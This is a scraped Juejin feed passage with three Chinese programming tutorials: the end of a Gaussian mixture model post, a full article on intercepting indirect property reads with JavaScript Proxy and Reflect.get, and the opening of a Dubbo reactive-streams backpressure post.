    [<span class="hljs-number">3.0</span>, <span class="hljs-number">4.0</span>, -<span class="hljs-number">7.0</span>],   <span class="hljs-comment"># 测试样本3</span>
    [-<span class="hljs-number">2.0</span>, -<span class="hljs-number">6.0</span>, <span class="hljs-number">4.0</span>]   <span class="hljs-comment"># 测试样本4</span>
])

<span class="hljs-comment"># 预测每个样本最可能属于哪个高斯成分</span>
<span class="hljs-built_in">print</span>(gmm.predict(test_samples)) 

<span class="hljs-comment"># === 输出 ===</span>
[<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>]
<span class="hljs-comment"># 表明了测试样本1属于第3个高斯分布，测试样本2属于第0个高斯分布，...</span>
</code></pre>
<p>以上就是混合高斯模型的所有内容了，对于看到这里的你，恭喜你，你现在已经掌握了这一强大的概率建模工具！</p>
<p>回想我最初学习机器学习时，常常是听说一个方法就去学，但学完却不知道它究竟能解决什么问题，学了跟没学一样，这或许是很多人共同的学习经历。<strong>而真正的理解，往往发生在你将一个抽象算法与一个具体问题联系起来的那一刻。</strong></p>
<p>举个有趣的例子吧，如今智能手机上的运动App都非常智能，你只要把手机揣在兜里或者拿在手上，然后开始运动，它就能通过分析手机的各种传感器数据，来自动推理出你当前的运动状态，是在<strong>步行、跑步、骑行</strong>，还是<strong>静止</strong>。我想你会好奇，它是怎么知道我们的运动状态的。</p>
<p>相信你在了解了混合高斯分布后就会理解它的原理：每个传感器（如加速度计、陀螺仪、GPS等）收集到的数据就是一个特征，传感器在每个时刻都会收集到数据。我们可以在一段时间内每隔0.5s采样一次所有传感器的数据，然后对这一段时间内的数据进行GMM聚类分析。将其分解成多个多元高斯分布，通过分析比对不同的高斯分布，就能推断出你的运动状态。如果你感兴趣，完全可以自己去尝试一下。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[详解实现属性的全面拦截]]></title>    <link>https://juejin.cn/post/7592882393251545131</link>    <guid>https://juejin.cn/post/7592882393251545131</guid>    <pubDate>2026-01-09T05:39:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592882393251545131" data-draft-id="7592921639463895082" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="详解实现属性的全面拦截"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-09T05:39:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Sept940"/> <meta itemprop="url" content="https://juejin.cn/user/3960862872450519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            详解实现属性的全面拦截
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3960862872450519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Sept940
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:39:09.000Z" title="Fri Jan 09 2026 05:39:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">目标</h2>
<p>在使用 Proxy 拦截属性时，一个常见挑战是：一次外部的属性访问，可能在内部触发对多个其他属性的读取。如何确保所有这些<strong>间接的属性访问</strong>都能被 Proxy 成功捕获并拦截，是我们需要解决的关键问题。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,
    <span class="hljs-attr">b</span>:<span class="hljs-number">2</span>,
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">c</span>(){
        <span class="hljs-comment">// 注意这里：this.a 和 this.b</span>
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">b</span>
    }
}

<span class="hljs-comment">// <span class="hljs-doctag">TODO:</span>实现属性的全面拦截</span>

proxy.<span class="hljs-property">c</span> <span class="hljs-comment">// 分别打印 read c、read a、read b ，并输出 proxy 的 c 属性</span>
</code></pre>
<h2 data-id="heading-1">初步设想</h2>
<p>我们来看一段代码</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,
    <span class="hljs-attr">b</span>:<span class="hljs-number">2</span>,
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">c</span>(){
        <span class="hljs-comment">// 注意这里：this.a 和 this.b</span>
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">b</span>
    }
}

<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj,{
    <span class="hljs-attr">get</span>:<span class="hljs-function">(<span class="hljs-params">target,key,receiver</span>)=&gt;</span>{
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'read'</span>,key)
        <span class="hljs-keyword">return</span> target[key]
    }
})

proxy.<span class="hljs-property">c</span> <span class="hljs-comment">// 访问 proxy 的 c 属性</span>
</code></pre>
<p>这段代码看起来挺简单，它的目标是：当有人想读 <code>proxy</code> 的任何属性时，我们都能先<code>console.log('read', key)</code>，然后把读取操作委托给原始对象 <code>obj</code>。</p>
<p>当你运行 <code>proxy.c</code> 的时候，你会发现控制台输出了：
<code>read c</code>
然后得到结果 <code>3</code>。</p>
<p>但是我们在访问 c 的时候，实际上还涉及了其他两个属性的访问，<code>this.a</code>和<code>this.b</code></p>
<p>原因，<code>return target[key]</code> 直接在原始对象 <code>obj</code> 上读取属性，导致 <code>obj.c</code> 的 <code>getter</code> 内部的 <code>this.a</code> 和 <code>this.b</code> 也直接访问 <code>obj</code> 的属性，从而绕过了 <code>proxy</code> 的拦截。</p>
<p>不好懂的话没关系，我们看图
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/192f070e73c14133aa4ec5e5d870191e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VwdDk0MA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541948&amp;x-signature=l9k928rzRpGoj8VRkDD2EykgDfk%3D" alt="image.png" loading="lazy"/>
上图展示了<code>target[key]</code>和<code>proxy[key]</code>的区别</p>
<p>由于<code>target</code>本身并没有拦截功能，所以当返回<code>target[key]</code>的时候，虽然读取了 <code>this.a</code> 和 <code>this.b</code>，但并未触发陷阱</p>
<h2 data-id="heading-2">返回 proxy[key]</h2>
<p>接着我们很容易就会想到，那就直接返回<code>proxy[key]</code></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,
    <span class="hljs-attr">b</span>:<span class="hljs-number">2</span>,
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">c</span>(){
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">b</span>
    }
}

<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj,{
    <span class="hljs-attr">get</span>:<span class="hljs-function">(<span class="hljs-params">target,key,receiver</span>)=&gt;</span>{
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'read'</span>,key)
        <span class="hljs-keyword">return</span> proxy[key] <span class="hljs-comment">// &lt;- 区别在这</span>
    }
})

proxy.<span class="hljs-property">c</span>
</code></pre>
<p>这就大错特错了，会陷入无限递归的循环</p>
<p>原因在于你第一步调用<code>proxy.c</code>的时候，触发了陷阱，于是他返回了一个<code>proxy[key]</code>（<code>key == c</code>），但是<code>proxy[key]</code>再次触发了陷阱，接着继续返回<code>proxy[key]</code>……</p>
<p>流程如图</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d65235f8ae764eed8f2f0bb228f15092~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VwdDk0MA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541948&amp;x-signature=XLTYoUrU9J4XZHrY5aHxC4YuE6k%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">使用反射</h2>
<p>现在停下来思考一下总结一下，现在所面临的根本矛盾在于</p>
<blockquote>
<p><code>target</code>本身不具有拦截功能，而具有拦截功能的<code>proxy</code>对自身的调用会陷入无限递归的局面</p>
</blockquote>
<p>那么我们如何实现一个，既具有拦截功能的同时，把递归的情况终止</p>
<p>我们看一下反射是如何解决这个问题的</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, propertyKey[, receiver])

-   target
    需要取值的目标对象

-   propertyKey
    需要获取的值的键值

-   receiver
    如果<span class="hljs-string">`target`</span>对象中指定了<span class="hljs-string">`getter`</span>，<span class="hljs-string">`receiver`</span>则为<span class="hljs-string">`getter`</span>调用时的<span class="hljs-string">`this`</span>值。
</code></pre>
<p>如果我们指定了<code>receiver</code>会发生什么，如下图第三个流程</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/573a00e6ccff4178bbdcfb986299c50d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VwdDk0MA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541948&amp;x-signature=mXEnMv60wu29ugma2UlklRxBEWU%3D" alt="image.png" loading="lazy"/></p>
<p>现在我们重写代码</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,
    <span class="hljs-attr">b</span>:<span class="hljs-number">2</span>,
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">c</span>(){
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">b</span>
    }
}

<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj,{
    <span class="hljs-attr">get</span>:<span class="hljs-function">(<span class="hljs-params">target,key,receiver</span>)=&gt;</span>{
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'read'</span>,key)
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(obj,key,proxy) <span class="hljs-comment">// &lt;- 区别在这</span>
    }
})

proxy.<span class="hljs-property">c</span> <span class="hljs-comment">// 将会分别打印 read c、read a、read b ，并输出 proxy 的 c 属性</span>
</code></pre>
<p>最终输出恰好如目标所言</p>
<h2 data-id="heading-4">结束了么？</h2>
<p>细心的朋友可能会想到，我能不能用<code>receiver</code>来替代<code>proxy</code>呢？</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,
    <span class="hljs-attr">b</span>:<span class="hljs-number">2</span>,
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">c</span>(){
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">b</span>
    }
}

<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj,{
    <span class="hljs-attr">get</span>:<span class="hljs-function">(<span class="hljs-params">target,key,receiver</span>)=&gt;</span>{
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'read'</span>,key)
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(obj,key,receiver) <span class="hljs-comment">// &lt;- 区别在这</span>
    }
})

proxy.<span class="hljs-property">c</span>
</code></pre>
<p>我们来看看 MDN 怎么解释的</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf16bd47c8ac43f5a5b2eca5f1e5a462~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VwdDk0MA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541948&amp;x-signature=vp4HA%2B9MzPvXyKrs6zM5bToABKY%3D" alt="image.png" loading="lazy"/></p>
<p><code>receiver</code>表示 Proxy 或者继承 Proxy 的对象</p>
<p>现在我们来区分一下</p>
<ol>
<li>如果填的是<code>proxy</code>，则所用到的代理拦截永远是<code>proxy</code>本身</li>
<li>如果填的是<code>receiver</code>，则所用到的代理拦截则是发属性访问的对象本身，也就是有可能是<code>proxy</code>，也有可能是继承自<code>proxy</code>的子类</li>
</ol>
<h2 data-id="heading-5">总结</h2>
<p>到这里，我们已经基本实现了一个简单的全面拦截属性的代理对象，但是至于用<code>receiver</code>还是<code>proxy</code>，这当然就看具体的业务需求了</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[1分钟了解响应式编程 | 合适的架构调整]]></title>    <link>https://juejin.cn/post/7592996072705507378</link>    <guid>https://juejin.cn/post/7592996072705507378</guid>    <pubDate>2026-01-09T05:47:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705507378" data-draft-id="7592992745573662758" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="1分钟了解响应式编程 | 合适的架构调整"/> <meta itemprop="keywords" content="后端,Java,响应式编程"/> <meta itemprop="datePublished" content="2026-01-09T05:47:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Mars酱"/> <meta itemprop="url" content="https://juejin.cn/user/1714893869821278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            1分钟了解响应式编程 | 合适的架构调整
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1714893869821278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Mars酱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:47:36.000Z" title="Fri Jan 09 2026 05:47:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>作者：Mars酱</p>
<p>声明：本文章由Mars酱编写，部分内容来源于网络，如有疑问请联系本人。</p>
<p>转载：欢迎转载，转载前先请联系我！</p>
</blockquote>
<h2 data-id="heading-0">前言</h2>
<p>上篇我们讲到了dubbo官方的例子，根据响应式的基本概念，dubbo 的 StreamObserver <strong>并不提供内置背压支持。</strong></p>
<p>毕竟RPC的设计初衷不是为了响应式而设计的，看下差异吧</p>
<h2 data-id="heading-1">RPC 和 响应式 的差异</h2>

























<table><thead><tr><th/><th>RPC</th><th>响应式</th></tr></thead><tbody><tr><td>是否阻塞</td><td>⭕️</td><td>❎</td></tr><tr><td>返回值</td><td>单值（一次调用，一次返回值）</td><td>多值（一次调用，流式返回值）</td></tr><tr><td>背压</td><td>不支持。客户端请求，服务端响应并推送，不管客户端是否有能力消费</td><td>支持。客户端请求，服务端推送，客户端消费可以控制消费速度，再向服务端拿。</td></tr></tbody></table>
<p>既然有差异，那如何完美处理</p>
<h2 data-id="heading-2">建立工程</h2>
<p>首先，我们确认一下目标：</p>
<ol>
<li>工程是dubbo框架；</li>
<li>工程支持 Flowable 背压式响应</li>
</ol>
<p>于是，我们创建一个dubbo工程，经典的consumer层、facade层、provider层三层结构，像是下面这样：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/589fa9deeeef466f9648531d2446385d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFyc-mFsQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768542455&amp;x-signature=uZ8T7IXDdvQ0wJxlWBpAmOlHBe4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">dubbo provider</h3>
<p>这是服务提供者工程，提供者给消费者提供每秒发送一个序列号，序列号是时间的毫秒数，上码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@DubboService(protocol = "tri")</span> <span class="hljs-comment">// ← 显式指定端口</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EventServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">EventService</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Flux&lt;Event&gt; <span class="hljs-title function_">streamRealTimeEvents</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> Flux.interval(Duration.ofSeconds(<span class="hljs-number">1</span>))
                .map(seq -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">"id-"</span> + seq, <span class="hljs-string">"Hello at "</span> + System.currentTimeMillis()));
    }
}
</code></pre>
<p>dubbo对外提供 Flux 流，Flux是reactor-core 这个jar包中的类，它的优势是和spring家族的集成比较好，比如：spring webflux。它是天然支持背压的对象。</p>
<h3 data-id="heading-4">dubbo consumer</h3>
<p>调用的地方跟我们调用本地接口一样，这是RPC的规范，因此我们在consumer端写一个单元测试区调用，上码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@SpringBootTest(classes = DubboConsumerApplication.class)</span>
